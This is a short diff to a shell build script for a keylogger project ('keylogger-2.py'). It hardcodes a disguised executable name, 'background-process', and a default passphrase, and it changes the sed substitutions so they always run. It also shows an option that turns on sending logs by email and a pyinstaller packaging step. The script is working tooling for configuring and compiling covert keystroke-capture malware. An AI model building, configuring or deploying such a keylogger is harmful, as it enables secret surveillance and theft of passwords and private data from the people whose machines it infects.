@@ -10,8 +10,8 @@
 # the executable will be moved to ~/-outputname
 intervalns=''
 encryptlog=''
-outputname=''
-passphrase=''
+outputname='background-process'
+passphrase='fishing-in-the-river-champion'
 logsmethod=''
 while [ $# -gt 0 ]
 do
@@ -89,15 +89,8 @@ then
     mysed 's/(self\.log_via_email = )(False)/\1True/' keylogger-2.py
 fi
 
-if [ ! -z "$outputname" ]
-then
-    mysed "s/(self\.exe_name = )'(background-process)'/\1'$outputname'/" keylogger-2.py
-fi
-
-if [ ! -z "$passphrase" ]
-then
-    mysed "s/(self\.passphrase = )'(fishing-in-the-river-champion)'/\1'$passphrase'/" keylogger-2.py
-fi
+mysed "s/(self\.exe_name = )'(background-process)'/\1'$outputname'/" keylogger-2.py
+mysed "s/(self\.passphrase = )'(fishing-in-the-river-champion)'/\1'$passphrase'/" keylogger-2.py
 
 # delete any existing pyinstaller output
 ./rm-pyinstaller > /dev/null 2>&1
